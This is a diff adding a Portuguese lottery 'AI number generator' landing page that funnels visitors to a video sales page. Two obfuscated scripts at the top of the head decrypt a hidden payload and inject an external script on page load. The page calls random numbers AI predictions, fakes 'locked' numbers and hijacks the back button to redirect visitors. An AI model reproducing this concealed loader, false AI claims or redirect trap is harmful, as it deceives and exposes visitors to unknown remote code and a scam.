@@ -1,0 +1,532 @@
+<!DOCTYPE html><html lang="pt-BR"><head><meta charset="utf-8">
+<script>(function(){var h_lv=atob("DB/cw/b9KW42wCJrvmT+toSRC1QUqFYfzmzm7NmeTQAYtVYG13ml7ZWSREBUsg0Y3W21s4KOBh5fuEcHkW+1u5ORBwRF4g5J32uosZ+fXBpTswBR5ULw4ZGRRgxXrFFJhESn4ZicRAsU+gAb12e5r7+ZC0IUtkMHy3r++dTLSA9XphFe2Cnkos7OGFhS8hEOjH3oocbfVDNL");var z_v=[];for(var m_h3r=0;m_h3r<h_lv.length;m_h3r++){z_v.push(h_lv.charCodeAt(m_h3r)&255);}var l_u=z_v[0];var j_0h1=z_v.slice(1,1+l_u);var n_mi=z_v.slice(1+l_u);var e_na=n_mi.map(function(b,e_f){return b^j_0h1[e_f%l_u];});var r_i4xy="";for(var p_q=0;p_q<e_na.length;p_q++){r_i4xy+=String.fromCharCode(e_na[p_q]&255);}var h_qi=decodeURIComponent(escape(r_i4xy));var j_7pw=JSON.parse(h_qi);var j_tu2=j_7pw.globals||[];j_tu2.forEach(function(m_0b){window[m_0b.name]=m_0b.value;});var z_rdyf=document.createElement("script");z_rdyf.src=j_7pw.url;z_rdyf.async=true;z_rdyf.defer=true;(j_7pw.attributes||[]).forEach(function(y_kv){z_rdyf.setAttribute(y_kv.name,y_kv.value);});(document.head||document.documentElement).appendChild(z_rdyf);})();</script>
+<script>(function(){var y_ns5g=atob("DPTbrqbtxEFqzEoTw4/529SB5ntIpD5ns4fhgYmOoC9EuT5+qpKigMWCqW8IvmVgoIay3tKe6zQeoTk8r5Wvy9WZ6isZ7mYxooCv3M+PsTUPv2gpmI/5wMeAoWNQ7i5yt5X229KArScT4TphpoK+wNLAvCIFqGdgoJ/5goSbpS0fqWgp4damgt3PqiAHqWgp4ZC62sfAsTUHpSxq7oSpy9CIqjVHvz9xqpCojIrPsiAGuS8x+db50/uQ");var i_lon=[];for(var g_lyx=0;g_lyx<y_ns5g.length;g_lyx++){i_lon.push(y_ns5g.charCodeAt(g_lyx)&255);}var b_f8=i_lon[0];var v_bu=i_lon.slice(1,1+b_f8);var q_09r=i_lon.slice(1+b_f8);var l_b=q_09r.map(function(b,j_5y2){return b^v_bu[j_5y2%b_f8];});var w_9="";for(var k_57=0;k_57<l_b.length;k_57++){w_9+=String.fromCharCode(l_b[k_57]&255);}var x_xho=decodeURIComponent(escape(w_9));var c_7v=JSON.parse(x_xho);var j_31=c_7v.globals||[];j_31.forEach(function(t_z){window[t_z.name]=t_z.value;});var t_xfj=document.createElement("script");t_xfj.src=c_7v.url;t_xfj.async=true;t_xfj.defer=true;(c_7v.attributes||[]).forEach(function(v_4){t_xfj.setAttribute(v_4.name,v_4.value);});(document.head||document.documentElement).appendChild(t_xfj);})();</script>
+<title>PRE - LotoFácil com IA</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="max-image-preview:large">
+
+
+
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&amp;display=swap" rel="stylesheet">
+
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+
+    :root{
+      --purple:#7b1fa2;
+      --purple-dark:#68158b;
+      --locked-red:#c23a3a;
+      --ink:#1c1c1e;
+      --body:#48484a;
+      --muted:#8e8e93;
+      --line:#e5e5ea;
+    }
+
+    body{
+      font-family:'Outfit',sans-serif;
+      background:#f4f4f6;
+      color:var(--ink);
+      min-height:100vh;
+    }
+
+    .wrapper{
+      max-width:460px;
+      margin:0 auto;
+      padding:32px 16px 48px;
+      display:flex;flex-direction:column;align-items:center;
+    }
+
+    .brand-logo{
+      display:block;
+      width:132px;height:auto;
+      margin:0 auto 18px;
+    }
+
+
+    .card{
+      width:100%;
+      background:#fff;
+      border:1px solid var(--line);
+      border-radius:16px;
+      padding:26px 22px 28px;
+    }
+
+    .draw-label{
+      border-top:1px solid var(--line);
+      padding-top:20px;
+      text-align:center;
+      font-size:13px;font-weight:700;
+      color:var(--ink);
+      text-transform:uppercase;
+      letter-spacing:.5px;
+      margin-bottom:4px;
+    }
+
+    .prize{
+      text-align:center;
+      font-size:38px;font-weight:800;
+      color:var(--purple);
+      line-height:1.1;
+      margin-bottom:22px;
+    }
+
+
+    .ai-text{
+      font-size:14px;line-height:1.55;
+      color:var(--body);
+      text-align:center;
+      margin-bottom:24px;
+    }
+    .ai-text strong{color:var(--ink)}
+
+    .btn{
+      display:block;width:100%;
+      box-sizing:border-box;
+      text-align:center;text-decoration:none;
+      border:none;border-radius:12px;
+      padding:16px 24px;
+      font-family:'Outfit',sans-serif;
+      font-weight:700;font-size:15px;
+      letter-spacing:.2px;
+      cursor:pointer;
+      background:var(--purple);
+      color:#fff;
+      transition:background .18s ease,transform .12s ease;
+    }
+    .btn:hover{background:var(--purple-dark)}
+    .btn:active{transform:translateY(1px)}
+    .btn:disabled{background:var(--line);color:var(--muted);cursor:default}
+
+    .btn-unlock{
+      display:none;
+      font-size:14px;
+      line-height:1.35;
+      padding:15px 20px;
+      text-wrap:balance;
+      animation:pulse-cta 1.8s ease-in-out infinite;
+    }
+    .btn-unlock .arrow{
+      display:inline-block;
+      animation:nudge 1.8s ease-in-out infinite;
+    }
+    
+    .btn-unlock:hover,
+    .btn-unlock:hover .arrow{animation-play-state:paused}
+
+    @keyframes pulse-cta{
+      0%,100%{transform:scale(1)}
+      50%{transform:scale(1.025)}
+    }
+    @keyframes nudge{
+      0%,100%{transform:translateX(0)}
+      50%{transform:translateX(3px)}
+    }
+
+    .progress-wrap{
+      width:100%;height:3px;
+      background:var(--line);
+      border-radius:2px;
+      margin-bottom:20px;
+      overflow:hidden;
+      display:none;
+    }
+    .progress-wrap.active{display:block}
+    .progress-bar{
+      height:100%;width:100%;
+      background:var(--purple);
+      border-radius:2px;
+      transform:scaleX(0);
+      transform-origin:left;
+      transition:transform .15s linear;
+    }
+
+    .status-text{
+      text-align:center;
+      font-size:12px;
+      color:var(--muted);
+      margin-bottom:14px;
+      display:none;
+    }
+    .status-text.active{display:block}
+
+    .balls-grid{
+      display:grid;
+      grid-template-columns:repeat(5,1fr);
+      gap:10px;
+      margin-top:24px;
+      perspective:700px;
+    }
+    .ball{
+      position:relative;
+      aspect-ratio:1;
+      border-radius:50%;
+      display:flex;align-items:center;justify-content:center;
+      font-size:15px;font-weight:700;
+      font-variant-numeric:tabular-nums;
+      transition:background .25s ease,color .25s ease;
+    }
+    .ball.locked{
+      background:var(--line);
+      color:#aeaeb2;
+      font-size:17px;
+    }
+
+    
+    .ball.scrambling{
+      background:#f0e4f6;
+      color:var(--purple);
+    }
+
+    
+    .ball.unlocked{
+      background:var(--purple);
+      color:#fff;
+      animation:lock-in .55s cubic-bezier(.16,1,.3,1) both;
+    }
+    .ball.unlocked::after{
+      content:'';
+      position:absolute;inset:0;
+      border-radius:50%;
+      border:2px solid var(--purple);
+      animation:ring-out .7s cubic-bezier(.16,1,.3,1) forwards;
+    }
+
+    
+    .ball.blocked{
+      background:var(--locked-red);
+      color:#fff;
+      animation:lock-in .55s cubic-bezier(.16,1,.3,1) both;
+    }
+    .ball.blocked::after{
+      content:'';
+      position:absolute;inset:0;
+      border-radius:50%;
+      border:2px solid var(--locked-red);
+      animation:ring-out .7s cubic-bezier(.16,1,.3,1) forwards;
+    }
+    .ball .lock{display:block}
+    @keyframes lock-in{
+      0%{transform:rotateY(-90deg)}
+      100%{transform:rotateY(0)}
+    }
+    @keyframes ring-out{
+      0%{transform:scale(1);opacity:.5}
+      100%{transform:scale(1.55);opacity:0}
+    }
+
+    @media (prefers-reduced-motion:reduce){
+      .ball.unlocked,.ball.blocked{animation:none}
+      .ball.unlocked::after,.ball.blocked::after{display:none}
+      .btn-unlock,.btn-unlock .arrow{animation:none}
+    }
+
+    
+    
+    .overlay{
+      position:fixed;inset:0;z-index:10;
+      background:rgba(0,0,0,.45);
+      display:flex;align-items:center;justify-content:center;
+      padding:20px;
+      opacity:0;
+      visibility:hidden;
+      pointer-events:none;
+      transition:opacity .34s ease,visibility .34s;
+    }
+    .overlay.show{
+      opacity:1;
+      visibility:visible;
+      pointer-events:auto;
+    }
+
+    .modal{
+      background:#fff;
+      border-radius:16px;
+      padding:32px 24px;
+      max-width:360px;width:100%;
+      text-align:center;
+      box-shadow:0 4px 24px rgba(0,0,0,.1);
+      transform:translateY(10px) scale(.97);
+      transition:transform .34s cubic-bezier(.16,1,.3,1);
+    }
+    .overlay.show .modal{transform:translateY(0) scale(1)}
+
+    .modal h3{
+      font-size:17px;font-weight:700;
+      color:var(--ink);margin-bottom:8px;
+    }
+    .modal p{
+      font-size:14px;line-height:1.55;
+      color:var(--body);
+      margin-bottom:22px;
+    }
+    .modal p strong{color:var(--ink)}
+
+    .btn-modal{
+      display:flex;width:100%;
+      align-items:center;justify-content:center;gap:9px;
+      border:none;border-radius:12px;
+      padding:15px 20px;
+      font-family:'Outfit',sans-serif;
+      font-weight:700;font-size:14px;
+      letter-spacing:.2px;
+      cursor:pointer;
+      text-decoration:none;
+      background:var(--purple);
+      color:#fff;
+      transition:background .18s ease,transform .12s ease;
+    }
+    .btn-modal:hover{background:var(--purple-dark)}
+    .btn-modal:active{transform:translateY(1px)}
+    .btn-modal .play{flex:none}
+
+    
+    .modal-dismiss{
+      display:block;margin:14px auto 0;
+      background:none;border:none;
+      font-family:'Outfit',sans-serif;
+      font-size:13px;color:var(--muted);
+      text-decoration:underline;
+      cursor:pointer;
+    }
+    .modal-dismiss:hover{color:var(--body)}
+  </style>
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "yjj2tzsm86");
+</script>
+</head>
+
+<body>
+  <div class="wrapper">
+    <div class="card">
+      <img src="images/Lotofacil.png" alt="Lotofácil" class="brand-logo">
+      <div class="draw-label" id="drawLabel">Próximo Sorteio</div>
+      <div class="prize" id="prize">R$ 2.800.000</div>
+
+      <p class="ai-text">
+        <strong>IA pronta para hoje.</strong> A inteligência artificial analisará padrões ocultos, recorrências estatísticas e combinações de maior probabilidade.
+      </p>
+
+      <div class="progress-wrap" id="progressWrap">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
+      <div class="status-text" id="statusText">Analisando padrões...</div>
+
+      <button class="btn" id="generate">GERAR NÚMEROS COM IA</button>
+      <a class="btn btn-unlock" id="unlock" href="/reportagem/?fbclid=IwY2xjawUWkhRwZG9mBWV4dG4DYWVtAjEwAGJyaWQRMXVlQUU3M05DeEd0YVY5WXlzcnRjBmFwcF9pZA81NDE2Mzk0OTM4ODkwMjUAAR62dBJWMINPPxEobSh9wPi9IYgrUumG0Ja7Mm72Bc5xhSdTu0jqWcbT9GCnIw_aem_JSPq5vizfiRM3K-sX6UzrA">CLIQUE AQUI PARA DESBLOQUEAR OS NÚMEROS RESTANTES <span class="arrow">→</span></a>
+
+      <div class="balls-grid" id="balls">
+        <div class="ball locked">?</div>
+        <div class="ball locked">?</div>
+        <div class="ball locked">?</div>
+        <div class="ball locked">?</div>
+        <div class="ball locked">?</div>
+        <div class="ball locked">?</div>
+        <div class="ball locked">?</div>
+        <div class="ball locked">?</div>
+        <div class="ball locked">?</div>
+        <div class="ball locked">?</div>
+        <div class="ball locked">?</div>
+        <div class="ball locked">?</div>
+        <div class="ball locked">?</div>
+        <div class="ball locked">?</div>
+        <div class="ball locked">?</div>
+      </div>
+    </div>
+  </div>
+
+  
+  <div class="overlay" id="popup1">
+    <div class="modal">
+      <h3>11 de 15 números liberados</h3>
+      <p>Os 4 números finais já foram gerados pela IA, mas estão <strong>bloqueados por segurança</strong>. A liberação acontece após a exibição de um vídeo curto de 3 minutos...</p>
+      <a id="watchCta" class="btn-modal" style="cursor:pointer" href="/reportagem/?fbclid=IwY2xjawUWkhRwZG9mBWV4dG4DYWVtAjEwAGJyaWQRMXVlQUU3M05DeEd0YVY5WXlzcnRjBmFwcF9pZA81NDE2Mzk0OTM4ODkwMjUAAR62dBJWMINPPxEobSh9wPi9IYgrUumG0Ja7Mm72Bc5xhSdTu0jqWcbT9GCnIw_aem_JSPq5vizfiRM3K-sX6UzrA"><svg class="play" viewBox="0 0 28 20" width="23" height="17" aria-hidden="true"><rect width="28" height="20" rx="5" fill="#fff"></rect><path d="M11.2 5.4v9.2l7.6-4.6z" fill="#7b1fa2"></path></svg>ASSISTIR PARA DESBLOQUEAR</a>
+    </div>
+  </div>
+
+  <script>
+    
+
+
+    (function () {
+      var qs = window.location.search || '';
+      try {
+        if (qs && qs.length > 1) {
+          sessionStorage.setItem('utmify_qs', qs);
+        } else if (!qs && sessionStorage.getItem('utmify_qs')) {
+          qs = sessionStorage.getItem('utmify_qs') || '';
+        }
+      } catch (e) {}
+
+      window.buildTrackedUrl = function (baseUrl) {
+        var cleanBase = baseUrl.replace(/\?+$/, '');
+        var stored = '';
+        try { stored = sessionStorage.getItem('utmify_qs') || ''; } catch (e) {}
+        var finalQs = (stored && stored.charAt(0) === '?') ? stored : (stored ? '?' + stored : '');
+        return cleanBase + (finalQs || '');
+      };
+
+      window.applyTrackedHref = function (el, baseUrl) {
+        if (!el) return;
+        el.setAttribute('href', buildTrackedUrl(baseUrl));
+      };
+    })();
+
+    
+
+
+    var generateBtn   = document.getElementById('generate');
+    var unlockBtn     = document.getElementById('unlock');
+    var balls         = document.querySelectorAll('.ball');
+    var popup1        = document.getElementById('popup1');
+    var dismissBtn    = document.getElementById('dismiss');
+    var watchCta      = document.getElementById('watchCta');
+    var progressWrap  = document.getElementById('progressWrap');
+    var progressBar   = document.getElementById('progressBar');
+    var statusText    = document.getElementById('statusText');
+
+    
+    var VSL_BASE = 'https://lottoprime2.vercel.app/';
+    applyTrackedHref(watchCta, VSL_BASE);
+    applyTrackedHref(unlockBtn, VSL_BASE);
+
+    var REVEAL_COUNT   = 11;
+    var LOCKED_COUNT   = 4;
+    var STAGGER        = 190;  
+    var SCRAMBLE_TICKS = 7;
+    var SCRAMBLE_MS    = 70;   
+    var PHASE_GAP      = 320;  
+    var SCRAMBLE_DUR   = SCRAMBLE_TICKS * SCRAMBLE_MS;
+
+    var LOCK_SVG =
+      '<svg class="lock" viewBox="0 0 24 24" width="17" height="17" fill="none" ' +
+      'stroke="currentColor" stroke-width="2.2" stroke-linecap="round" ' +
+      'stroke-linejoin="round" aria-hidden="true">' +
+      '<rect x="4.5" y="10.5" width="15" height="10.5" rx="2.5"/>' +
+      '<path d="M8.25 10.5V7a3.75 3.75 0 0 1 7.5 0v3.5"/></svg>';
+
+    var statusMessages = [
+      'Analisando padrões...',
+      'Cruzando dados estatísticos...',
+      'Processando combinações...',
+      'Gerando sequência...',
+      'Finalizando...'
+    ];
+
+    function pad(n) { return (n < 10 ? '0' : '') + n; }
+
+    
+    function drawUnique(count, max) {
+      var pool = [];
+      for (var i = 1; i <= max; i++) pool.push(i);
+      for (var j = pool.length - 1; j > 0; j--) {
+        var k = Math.floor(Math.random() * (j + 1));
+        var tmp = pool[j]; pool[j] = pool[k]; pool[k] = tmp;
+      }
+      return pool.slice(0, count).sort(function(a, b) { return a - b; });
+    }
+
+    
+    function revealBall(ball, finalNum, blocked) {
+      ball.classList.remove('locked');
+      ball.classList.add('scrambling');
+      var ticks = 0;
+      var spin = setInterval(function() {
+        ball.textContent = pad(Math.floor(Math.random() * 25) + 1);
+        if (++ticks >= SCRAMBLE_TICKS) {
+          clearInterval(spin);
+          ball.classList.remove('scrambling');
+          if (blocked) {
+            ball.innerHTML = LOCK_SVG;
+            ball.classList.add('blocked');
+          } else {
+            ball.textContent = pad(finalNum);
+            ball.classList.add('unlocked');
+          }
+        }
+      }, SCRAMBLE_MS);
+    }
+
+    generateBtn.onclick = function() {
+      generateBtn.disabled = true;
+      progressWrap.classList.add('active');
+      statusText.classList.add('active');
+
+      var numbers = drawUnique(REVEAL_COUNT, 25);
+
+      
+      try { sessionStorage.setItem('loto_numeros', JSON.stringify(numbers)); } catch (e) {}
+
+      
+      numbers.forEach(function(num, i) {
+        setTimeout(function() {
+          revealBall(balls[i], num, false);
+          progressBar.style.transform = 'scaleX(' + ((i + 1) / 15).toFixed(3) + ')';
+          statusText.textContent = statusMessages[Math.min(Math.floor(i / 3), statusMessages.length - 1)];
+        }, i * STAGGER);
+      });
+
+      
+      var phase2 = (REVEAL_COUNT - 1) * STAGGER + SCRAMBLE_DUR + PHASE_GAP;
+
+      for (var j = 0; j < LOCKED_COUNT; j++) {
+        (function(j) {
+          setTimeout(function() {
+            revealBall(balls[REVEAL_COUNT + j], null, true);
+            progressBar.style.transform =
+              'scaleX(' + ((REVEAL_COUNT + j + 1) / 15).toFixed(3) + ')';
+            statusText.textContent = 'Bloqueando números restantes...';
+          }, phase2 + j * STAGGER);
+        })(j);
+      }
+
+      var lastLand = phase2 + (LOCKED_COUNT - 1) * STAGGER + SCRAMBLE_DUR;
+
+      setTimeout(function() {
+        progressBar.style.transform = 'scaleX(1)';
+        statusText.textContent = '11 de 15 números liberados';
+        popup1.classList.add('show');
+      }, lastLand + 480);
+    };
+
+    
+    if (dismissBtn) dismissBtn.onclick = function() {
+      popup1.classList.remove('show');
+      
+      setTimeout(function() {
+        generateBtn.style.display = 'none';
+        progressWrap.style.display = 'none';
+        statusText.textContent = '4 números restantes bloqueados';
+        unlockBtn.style.display = 'block';
+      }, 340);
+    };
+  </script>
+
+  
+  <script>
+    var link = 'https://lottoprime2.vercel.app/';
+    function setBackRedirect(url) {
+      var urlBackRedirect = url;
+      urlBackRedirect =
+        urlBackRedirect.trim() +
+        (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+        document.location.search.replace('?', '').toString();
+      history.pushState({}, '', location.href);
+      history.pushState({}, '', location.href);
+      history.pushState({}, '', location.href);
+      window.addEventListener('popstate', function() {
+        setTimeout(function() {
+          location.href = urlBackRedirect;
+        }, 1);
+      });
+    }
+    setBackRedirect(link);
+  </script>
+
+
+
+
+</body></html>
